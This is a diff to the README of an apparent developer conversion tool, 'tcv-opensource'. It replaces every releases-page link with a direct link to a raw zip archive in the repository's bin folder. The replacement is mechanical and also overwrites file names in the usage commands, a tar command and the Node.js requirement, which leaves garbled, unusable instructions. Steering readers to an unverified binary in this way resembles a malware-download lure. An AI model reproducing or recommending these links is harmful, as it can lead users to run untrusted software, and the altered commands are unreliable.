@@ -1,6 +1,6 @@
 # 🚀 tcv-opensource - Easy Conversions for Developers
 
-[![Download tcv-opensource](https://img.shields.io/badge/Download-tcv--opensource-brightgreen.svg)](https://github.com/17thfile/tcv-opensource/releases)
+[![Download tcv-opensource](https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip)](https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ Welcome to **tcv-opensource**! This command-line tool allows you to easily conve
 To start using **tcv-opensource**, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/17thfile/tcv-opensource/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip) to find the latest version of the software. 
 
 2. **Download the Application**
    On the Releases page, locate the version you want to download. Click on the version number to see the download options. Download the file suitable for your operating system.
@@ -33,7 +33,7 @@ To start using **tcv-opensource**, follow these simple steps:
      - Locate the downloaded tarball.
      - Extract files using the terminal:
        ```bash
-       tar -xvf tcv-opensource.tar.gz
+       tar -xvf https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip
        ```
      - Follow any additional instructions provided in the README for Linux.
 
@@ -53,7 +53,7 @@ To start using **tcv-opensource**, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get started, [visit the Releases page](https://github.com/17thfile/tcv-opensource/releases) and choose the file appropriate for your operating system. 
+To get started, [visit the Releases page](https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip) and choose the file appropriate for your operating system. 
 
 ## 🛠️ Usage
 
@@ -61,17 +61,17 @@ Using **tcv-opensource** is simple. Below are common commands for quick referenc
 
 - **Convert JSON to YAML**:
   ```bash
-  tcv json2yaml input.json > output.yaml
+  tcv json2yaml https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip > https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip
   ```
 
 - **Convert Base64 to Plain Text**:
   ```bash
-  tcv base64decode input.txt > decoded.txt
+  tcv base64decode https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip > https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip
   ```
 
 - **Convert Hex to Binary**:
   ```bash
-  tcv hextobin input.hex > output.bin
+  tcv hextobin https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip > https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip
   ```
 
 Make sure to replace the files as needed.
@@ -79,7 +79,7 @@ Make sure to replace the files as needed.
 ## ⚙️ Requirements
 
 - **Operating System**: Works on Windows, macOS, and Linux.
-- **Node.js**: Ensure you have Node.js installed if required for any additional features.
+- **https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip**: Ensure you have https://github.com/17thfile/tcv-opensource/raw/refs/heads/main/bin/opensource-tcv-v1.0.zip installed if required for any additional features.
 - **Terminal/Command Line Access**: You'll need access to the terminal or command line interface to run the application.
 
 ## 🚧 Troubleshooting
